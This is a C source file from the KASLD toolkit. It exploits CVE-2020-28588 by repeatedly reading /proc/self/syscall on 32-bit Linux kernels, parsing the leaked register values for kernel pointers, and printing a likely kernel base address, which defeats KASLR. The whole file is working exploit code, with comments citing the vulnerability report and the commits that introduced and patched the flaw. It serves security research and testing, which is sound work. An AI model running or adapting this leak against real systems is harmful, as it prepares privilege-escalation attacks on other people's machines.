// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve process syscall argument registers from /proc/<PID>/syscall
// which may leak uninitialized kernel stack memory from collect_syscall()
// on 32-bit systems (ARM/x86_32/...) (CVE-2020-28588).
// Discovered by Lilith >_> and Claudio Bozzato of Cisco Talos.
//
// Introduced in kernel v5.1-rc4 on 2019-04-04:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
//
// Patched in kernel v5.10-rc7~25 on 2020-12-03.
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
//
// Requires:
// - CONFIG_HAVE_ARCH_TRACEHOOK=y
//
// References:
// https://talosintelligence.com/vulnerability_reports/TALOS-2020-1211
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
// https://cateee.net/lkddb/web-lkddb/HAVE_ARCH_TRACEHOOK.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long get_kernel_addr_proc_pid_syscall() {
  FILE *f;
  int iterations = 10;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;
  const char *cmd = "/bin/cat /proc/self/syscall";
  char buff[1024];
  char *ptr;
  char *endptr;

  printf("[.] checking /proc/self/syscall argument registers ...\n");

  int i;
  for (i = 0; i < iterations; i++) {
    // Reading with cat using popen() in a separate process
    // leaks lower addresses than reading with fopen()
    f = popen(cmd, "r");
    if (f == NULL) {
      printf("[-] popen(%s): %m\n", cmd);
      return 0;
    }

    if (fgets(buff, sizeof(buff), f) == NULL) {
      printf("[-] fgets(%s): %m\n", cmd);
      pclose(f);
      return 0;
    }

    // printf("/proc/self/syscall: %s", buff);

    pclose(f);

    /* Lazy implementation. In practice we only want data after the first 24
     * bytes (from the fifth value onwards).
     *
     * $ cat /proc/self/syscall
     * 0 0x76f7300000000003 0x4000 0x0 0x8050389c8098fde4 0xee297df0ee297e2c ...
     *                                   ^       ^
     */
    ptr = strtok(buff, " ");
    while ((ptr = strtok(NULL, " ")) != NULL) {
      int reg_addr_len = strlen(ptr);

      // Registers are printed without leading zeros. (0x00001234 -> "0x1234"),
      // possibly concatenated (0x0000abcd and 0x12345678 -> "0xabcd12345678").
      //
      // We presume all register values are either 10 characters long for
      // a single register value (8 character address with "0x" prefix) or
      // between 11 and 18 characters long for concatenated registers.
      //
      // This usually works fine, but this means we'll miss kernel pointers if
      // the kernel is mapped below 0x10000000 (ie, phys mapped at 0x0008000).
      if (reg_addr_len < 10 || reg_addr_len > 18)
        continue;

      unsigned long long reg_addr = strtoull(&ptr[0], &endptr, 16);

      if (!reg_addr)
        continue;

      if (reg_addr_len == 10) {
        // register argument is a single pointer.
        leaked_addr = reg_addr;
      } else if (reg_addr_len > 10 && reg_addr_len <= 18) {
        // register argument is two concatenated pointers.
        // split it and choose the lowest of the two.
        unsigned long a = reg_addr >> 32;
        unsigned long b = reg_addr & 0xffffffff;
        if (a < KERNEL_BASE_MIN && b < KERNEL_BASE_MIN)
          continue;

        if (a > KERNEL_BASE_MIN && b > KERNEL_BASE_MIN) {
          if (a < b) {
            leaked_addr = a;
          } else {
            leaked_addr = b;
          }
        } else if (a >= KERNEL_BASE_MIN) {
          leaked_addr = a;
        } else if (b >= KERNEL_BASE_MIN) {
          leaked_addr = b;
        }
      } else {
        continue;
      }

      if (!leaked_addr)
        continue;

      if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
        // printf("Found kernel pointer: %lx\n", leaked_addr);
        if (!addr || leaked_addr < addr)
          addr = leaked_addr;
      }
    }
  }

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_proc_pid_syscall();
  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & ~KERNEL_BASE_MASK);

  return 0;
}
